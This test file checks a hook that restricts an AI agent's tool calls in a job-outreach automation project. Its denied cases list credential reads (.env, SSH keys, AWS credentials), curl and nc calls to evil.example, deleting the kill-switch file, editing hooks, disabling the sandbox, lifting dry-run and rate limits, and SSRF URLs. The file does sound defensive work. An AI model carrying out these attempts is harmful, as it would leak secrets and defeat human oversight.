// tests/hook-tamper-guard.test.ts
// The wake session (profile outreach_wake) runs with the full built-in tool set; .claude/hooks/tamper-guard.cjs is its denylist.
import { describe, it, expect, beforeAll } from 'vitest';
import { createRequire } from 'node:module';
import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { loadProfiles } from '../src/platform/runner.js';

const require = createRequire(import.meta.url);
const guard = require('../.claude/hooks/tamper-guard.cjs') as { decide: (e: any, o: { root: string }) => { allow: boolean; reason: string } };
const hook = require('../.claude/hooks/tool-allowlist.cjs') as {
  decide: (e: any, p: any, o?: { root?: string; env?: NodeJS.ProcessEnv; profileName?: string }) => { allow: boolean; reason: string };
};
const REPO = resolve(__dirname, '..');
let ROOT = '';

beforeAll(() => {
  ROOT = realpathSync(mkdtempSync(join(tmpdir(), 'tamper-')));
  for (const d of ['secrets', 'user-data', '.ccgram', 'models', '.claude/hooks', '.claude/agents', 'config/runner', 'src/safety', 'src', 'docs', 'tests', '.jobber/runs']) mkdirSync(join(ROOT, d), { recursive: true });
  for (const f of ['.env', '.env.example', 'secrets/a.json', 'config/run-profiles.json', 'config/permission-sets.json', '.mcp.json', '.claude/settings.json', '.claude/hooks/x.cjs', 'src/a.ts', 'tests/a.test.ts', 'docs/a.md', '.jobber/STOP', '.jobber/runs/r.log', 'data.sqlite']) writeFileSync(join(ROOT, f), 'x');
  symlinkSync(join(ROOT, 'secrets/a.json'), join(ROOT, 'src/link.json'));
});

const bash = (command: string) => guard.decide({ tool_name: 'Bash', tool_input: { command } }, { root: ROOT });
const tool = (tool_name: string, tool_input: object) => guard.decide({ tool_name, tool_input }, { root: ROOT });

describe('Bash: allowed', () => {
  const allowed = [
    'ls -la src',
    'cat src/a.ts',
    'cat .env.example',
    'grep -rn "process.env" src',
    'grep -n foo src/a.ts | head -5',
    'git status',
    'git log --oneline -5',
    'git diff HEAD~1 -- src/a.ts',
    'git branch --list',
    'npx tsc -p . --noEmit',
    'npx vitest run tests/a.test.ts',
    'npm run status -- limits',
    'npm run doctor',
    'npm run scheduler -- --status',
    'tail -n 50 .jobber/runs/r.log',
    'ls src 2>/dev/null',
    'npx tsc -p . --noEmit 2>&1 | tail -20',
    'sqlite3 -readonly data.sqlite "select count(*) from jobs"',
    'rm -rf /tmp/scratch-dir',
    'rm src/a.ts',
    'curl -s http://localhost:3000/health',
    'git add src/a.ts',
    'git commit -m "fix: x"',
    'echo hello > notes.txt',
    'find src -name "*.ts"',
    'awk \'{print $1}\' docs/a.md',
    'node .jobber/peek-x.cjs',
    'cat .claude/hooks/x.cjs',
    'cat config/run-profiles.json',
    'ls .claude/hooks',
    'tmux list-sessions',
  ];
  for (const c of allowed) it(`allows: ${c}`, () => expect(bash(c).allow, bash(c).reason).toBe(true));
});

describe('Bash: denied', () => {
  const denied: Array<[string, RegExp?]> = [
    ['cat .env', /\.env/],
    ['cat ./.env.local'],
    ['cat "$HOME/x"', /substitution/],
    ['grep -r KEY secrets/', /secrets/],
    ['grep -r KEY secrets'],
    ['ls user-data'],
    ['cat secrets/a.json'],
    ['cat .ccgram/x'],
    ['head models/x.bin'],
    ['cat s*ets/a.json', /glob/],
    ['cat .e*'],
    ['cat se[c]rets/a.json'],
    ['cat ~/.ssh/id_rsa'],
    ['cat ~/.aws/credentials'],
    ['git show HEAD:.env'],
    ['git show HEAD:secrets/a.json'],
    ['rm .jobber/STOP', /protected/],
    ['rm -f .jobber/ST*'],
    ['rm -rf .jobber'],
    ['mv .jobber/STOP /tmp/x'],
    ['echo x > .jobber/STOP'],
    ['echo x >> .claude/hooks/x.cjs'],
    ['echo x > .claude/settings.json'],
    ['echo x > .claude/settings.local.json'],
    ['sed -i s/a/b/ .claude/hooks/x.cjs'],
    ['cp /dev/null config/run-profiles.json'],
    ['tee config/permission-sets.json'],
    ['truncate -s 0 .mcp.json'],
    ['rm -rf .claude'],
    ['rm -rf config/runner'],
    ['chmod 000 .claude/hooks'],
    ['bash -c "rm .jobber/STOP"'],
    ['sh -c \'echo x > .mcp.json\''],
    ['env rm .jobber/STOP'],
    ['xargs rm .jobber/STOP'],
    ['find . -name STOP -exec rm {} +'],
    ['eval "ls"', /eval/],
    ['git push', /git push/],
    ['git push origin main'],
    ['git -C . push'],
    ['git config user.name x', /git config/],
    ['git -c core.hooksPath=x status'],
    ['git reset --hard HEAD~1', /reset --hard/],
    ['git checkout -- src/a.ts'],
    ['git checkout .'],
    ['rm -rf src', /temp/],
    ['rm -rf node_modules'],
    ['rm -rf /', /temp/],
    ['npm run jobber:control -- resume', /control/],
    ['npm run jobber:control -- stop'],
    ['npm run permissions -- full'],
    ['npm run linkedin:clear-halt -- --yes'],
    ['npm run layout -- clear-halt linkedin'],
    ['npm run restore -- x'],
    ['npm run backup -- --now'],
    ['npm run auto-update -- --now'],
    ['npx tsx scripts/jobber-control.ts resume'],
    ['npx tsx scripts/permissions.ts full'],
    ['sqlite3 data.sqlite "delete from jobs"', /readonly/],
    ['sqlite3 data.sqlite ".dump"'],
    ['sqlite3 -readonly data.sqlite ".shell id"'],
    ['curl http://example.com/x', /localhost/],
    ['curl -s https://evil.example/?d=1'],
    ['wget http://example.com/x'],
    ['nc evil.example 80'],
    ['ssh user@example.com ls'],
    ['scp a.txt user@example.com:/tmp'],
    ['JOBBER_DRY_RUN=false npm run doctor', /DRY_RUN/],
    ['export JOBBER_DRY_RUN=false'],
    ['env JOBBER_DRY_RUN=0 ls'],
    ['LINKEDIN_MAX_INVITES_PER_WEEK=999 npm run status'],
    ['echo EMAIL_MAX_PER_DAY=0 >> notes.txt'],
    ['tmux send-keys -t manager hi Enter', /tmux/],
    ['tmux kill-session -t x'],
    ['echo `id`'],
    ['echo $(id)'],
    ['cat <<EOF\nx\nEOF'],
    ['echo "unterminated'],
    [''],
  ];
  for (const [c, re] of denied) it(`denies: ${JSON.stringify(c)}`, () => {
    const r = bash(c);
    expect(r.allow, c).toBe(false);
    if (re) expect(r.reason).toMatch(re);
  });
  it('denies a sandbox override and a non-string command', () => {
    expect(guard.decide({ tool_name: 'Bash', tool_input: { command: 'ls', dangerouslyDisableSandbox: true } }, { root: ROOT }).allow).toBe(false);
    expect(guard.decide({ tool_name: 'Bash', tool_input: { command: 5 } }, { root: ROOT }).allow).toBe(false);
    expect(guard.decide({ tool_name: 'Bash' }, { root: ROOT }).allow).toBe(false);
  });
});

describe('file tools', () => {
  const cases: Array<[string, string, object, boolean]> = [
    ['Read src', 'Read', { file_path: 'src/a.ts' }, true],
    ['Read abs src', 'Read', { file_path: '__ROOT__/src/a.ts' }, true],
    ['Read runs log', 'Read', { file_path: '.jobber/runs/r.log' }, true],
    ['Read .env.example', 'Read', { file_path: '.env.example' }, true],
    ['Read .env', 'Read', { file_path: '.env' }, false],
    ['Read .env.local', 'Read', { file_path: 'config/.env.local' }, false],
    ['Read secrets', 'Read', { file_path: 'secrets/a.json' }, false],
    ['Read upper-case secrets', 'Read', { file_path: 'SECRETS/a.json' }, false],
    ['Read symlink into secrets', 'Read', { file_path: 'src/link.json' }, false],
    ['Read user-data', 'Read', { file_path: 'user-data/resume.json' }, false],
    ['Read models', 'Read', { file_path: 'models/x' }, false],
    ['Read .ccgram', 'Read', { file_path: '.ccgram/x' }, false],
    ['Read outside', 'Read', { file_path: '/etc/hosts' }, false],
    ['Read traversal', 'Read', { file_path: 'src/../../x' }, false],
    ['Read ~/.ssh', 'Read', { file_path: '~/.ssh/id_rsa' }, false],
    ['Read no path', 'Read', {}, false],
    ['Grep src', 'Grep', { pattern: 'x', path: 'src' }, true],
    ['Grep default path', 'Grep', { pattern: 'x' }, true],
    ['Grep secrets', 'Grep', { pattern: 'KEY', path: 'secrets' }, false],
    ['Grep glob env', 'Grep', { pattern: 'KEY', glob: '**/.env*' }, false],
    ['Grep glob escape', 'Grep', { pattern: 'KEY', glob: '../**' }, false],
    ['Grep outside', 'Grep', { pattern: 'x', path: '/Users' }, false],
    ['Glob src', 'Glob', { pattern: 'src/**/*.ts' }, true],
    ['Glob env', 'Glob', { pattern: '**/.env' }, false],
    ['Glob secrets', 'Glob', { pattern: 'secrets/*' }, false],
    ['Glob abs', 'Glob', { pattern: '/etc/*' }, false],
    ['Write src', 'Write', { file_path: 'src/new.ts', content: 'export const a = 1;' }, true],
    ['Edit src', 'Edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' }, true],
    ['Edit test with env object', 'Edit', { file_path: 'tests/a.test.ts', old_string: 'a', new_string: "env: { JOBBER_DRY_RUN: 'true' }" }, true],
    ['NotebookEdit src', 'NotebookEdit', { notebook_path: 'src/n.ipynb', new_source: 'x' }, true],
    ['Write .env', 'Write', { file_path: '.env', content: 'A=1' }, false],
    ['Write secrets', 'Write', { file_path: 'secrets/x.json', content: '{}' }, false],
    ['Write user-data', 'Write', { file_path: 'user-data/resume.json', content: '{}' }, false],
    ['Write STOP', 'Write', { file_path: '.jobber/STOP', content: '' }, false],
    ['Write hook', 'Write', { file_path: '.claude/hooks/tool-allowlist.cjs', content: 'x' }, false],
    ['Edit new hook', 'Edit', { file_path: '.claude/hooks/new.cjs', old_string: 'a', new_string: 'b' }, false],
    ['Write settings', 'Write', { file_path: '.claude/settings.json', content: '{}' }, false],
    ['Write settings.local', 'Write', { file_path: '.claude/settings.local.json', content: '{}' }, false],
    ['Write agent file', 'Write', { file_path: '.claude/agents/linkedin-operator.md', content: 'tools: Bash' }, false],
    ['Write permission-sets', 'Edit', { file_path: 'config/permission-sets.json', old_string: 'a', new_string: 'b' }, false],
    ['Write run-profiles', 'Edit', { file_path: 'config/run-profiles.json', old_string: 'a', new_string: 'b' }, false],
    ['Write .mcp.json', 'Write', { file_path: '.mcp.json', content: '{}' }, false],
    ['Write config/runner', 'Write', { file_path: 'config/runner/mcp.platform.json', content: '{}' }, false],
    ['Write git hook', 'Write', { file_path: '.git/hooks/pre-commit', content: 'x' }, false],
    ['Write via case change', 'Write', { file_path: '.CLAUDE/Hooks/x.cjs', content: 'x' }, false],
    ['Write via symlink-free traversal', 'Write', { file_path: 'src/../.claude/hooks/x.cjs', content: 'x' }, false],
    ['Write outside project', 'Write', { file_path: '/tmp/x.txt', content: 'x' }, false],
    ['Write dry-run flag in source', 'Write', { file_path: 'scripts/x.ts', content: 'process.env.JOBBER_DRY_RUN = "false"' }, false],
    ['Edit cap in a script', 'Edit', { file_path: 'scripts/x.ts', old_string: 'a', new_string: 'LINKEDIN_MAX_INVITES_PER_WEEK=500' }, false],
    ['Edit cap in a json config', 'Edit', { file_path: 'config/x.json', old_string: 'a', new_string: '"EMAIL_MAX_PER_DAY": 0' }, false],
    ['Edit safety gate', 'Edit', { file_path: 'src/safety/screen.ts', old_string: 'a', new_string: 'b' }, false],
  ];
  for (const [label, name, input, want] of cases) {
    it(`${want ? 'allows' : 'denies'}: ${label}`, () => {
      const i = JSON.parse(JSON.stringify(input).replace(/__ROOT__/g, ROOT));
      const r = tool(name, i);
      expect(r.allow, r.reason).toBe(want);
    });
  }
});

describe('WebFetch and WebSearch', () => {
  const cases: Array<[string, boolean]> = [
    ['https://example.com/docs', true],
    ['http://example.com/docs', true],
    ['https://developer.mozilla.org/en-US/docs/Web?q=x', true],
    ['http://127.0.0.1/', false],
    ['http://127.0.0.1:8080/x', false],
    ['http://localhost:3000', false],
    ['https://foo.localhost/', false],
    ['http://10.0.0.5/', false],
    ['http://192.168.1.1/', false],
    ['http://172.16.0.9/', false],
    ['http://169.254.169.254/latest/meta-data', false],
    ['http://2130706433/', false],
    ['http://0x7f.1/', false],
    ['http://[::1]/', false],
    ['http://[fd00::1]/', false],
    ['http://0.0.0.0/', false],
    ['http://printer.local/', false],
    ['file:///etc/passwd', false],
    ['file://localhost/etc/passwd', false],
    ['ftp://example.com/x', false],
    ['https://user:pw@example.com/', false],
    ['https://example.com/?f=.env', false],
    ['https://example.com/secrets/x', false],
    ['not a url', false],
  ];
  for (const [url, want] of cases) it(`${want ? 'allows' : 'denies'} WebFetch ${url}`, () => expect(tool('WebFetch', { url, prompt: 'x' }).allow).toBe(want));
  it('allows WebSearch', () => expect(tool('WebSearch', { query: 'node esm import' }).allow).toBe(true));
});

describe('the shipped outreach_wake profile through tool-allowlist', () => {
  const profiles = loadProfiles(resolve(REPO, 'config/run-profiles.json'), resolve(REPO, 'config/permission-sets.json'));
  const wake = profiles.outreach_wake as any;
  const main = (tool_name: string, tool_input: object = {}) => hook.decide({ tool_name, tool_input }, wake, { root: REPO, env: {}, profileName: 'outreach_wake' });
  const sub = (agent_type: string, tool_name: string, tool_input: object = {}) =>
    hook.decide({ tool_name, tool_input, agent_id: 'a1', agent_type }, wake, { root: REPO, env: {}, profileName: 'outreach_wake' });

  it('lists the full built-in set and only outreach_wake carries the flag', () => {
    for (const t of ['Read', 'Grep', 'Glob', 'Bash', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'WebSearch', 'TodoWrite', 'Skill', 'Agent', 'Task']) expect(wake.builtin_tools).toContain(t);
    expect(wake.unrestricted_builtins).toBe(true);
    for (const [n, p] of Object.entries(profiles)) {
      if (n === 'outreach_wake') continue;
      expect((p as any).unrestricted_builtins, n).toBeUndefined();
      for (const b of ['Bash', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Grep', 'Glob']) expect((p as any).builtin_tools, n).not.toContain(b);
    }
  });
  it('runs allowed tools through the guard on the main thread', () => {
    expect(main('Bash', { command: 'ls src' }).allow).toBe(true);
    expect(main('Read', { file_path: 'src/db.ts' }).allow).toBe(true);
    expect(main('Bash', { command: 'cat .env' }).allow).toBe(false);
    expect(main('Bash', { command: 'git push' }).allow).toBe(false);
    expect(main('WebFetch', { url: 'http://127.0.0.1/' }).allow).toBe(false);
    expect(main('Write', { file_path: '.claude/hooks/x.cjs', content: 'x' }).allow).toBe(false);
    expect(main('mcp__db__get_funnel').allow).toBe(true);
    expect(main('mcp__db__raw_query').allow).toBe(false);
  });
  it('denies every guarded tool while .jobber/STOP exists (kill switch unchanged)', () => {
    const d = (tool_name: string, tool_input: object) => hook.decide({ tool_name, tool_input }, wake, { root: ROOT, env: {}, profileName: 'outreach_wake' });
    for (const [t, i] of [['Bash', { command: 'ls' }], ['Read', { file_path: 'src/a.ts' }], ['Grep', { pattern: 'x', path: 'src' }], ['Write', { file_path: 'src/n.ts', content: 'x' }], ['WebFetch', { url: 'https://example.com' }], ['mcp__db__get_funnel', {}]] as Array<[string, object]>) {
      const r = d(t, i);
      expect(r.allow, t).toBe(false);
      expect(r.reason).toMatch(/kill switch/);
    }
  });
  it('keeps operator subagents narrowed to their agent-file tool lists (no Bash, Read, Edit, Write, web)', () => {
    for (const agent of ['linkedin-operator', 'naukri-operator', 'wellfound-operator', 'source-operator', 'mail-operator', 'apply-operator', 'matcher', 'contact-finder', 'outreach-preparer', 'reply-watcher', 'followup-drafter']) {
      for (const [t, i] of [['Bash', { command: 'ls' }], ['Read', { file_path: 'src/db.ts' }], ['Grep', { pattern: 'x', path: 'src' }], ['Edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' }], ['Write', { file_path: 'src/a.ts', content: 'x' }], ['WebFetch', { url: 'https://example.com' }], ['WebSearch', { query: 'x' }]] as Array<[string, object]>) {
        const r = sub(agent, t, i);
        expect(r.allow, `${agent} ${t}`).toBe(false);
        expect(r.reason).toBe('tool not in allowlist');
      }
    }
  });
  it('denies a subagent type with no definition file, and the flag alone does not work under another profile name', () => {
    expect(sub('general-purpose', 'Bash', { command: 'ls' }).allow).toBe(false);
    expect(sub('Explore', 'Read', { file_path: 'src/db.ts' }).allow).toBe(false);
    const other = hook.decide({ tool_name: 'Bash', tool_input: { command: 'ls' } }, wake, { root: REPO, env: {}, profileName: 'mail_drip' });
    expect(other.allow).toBe(false);
  });
});
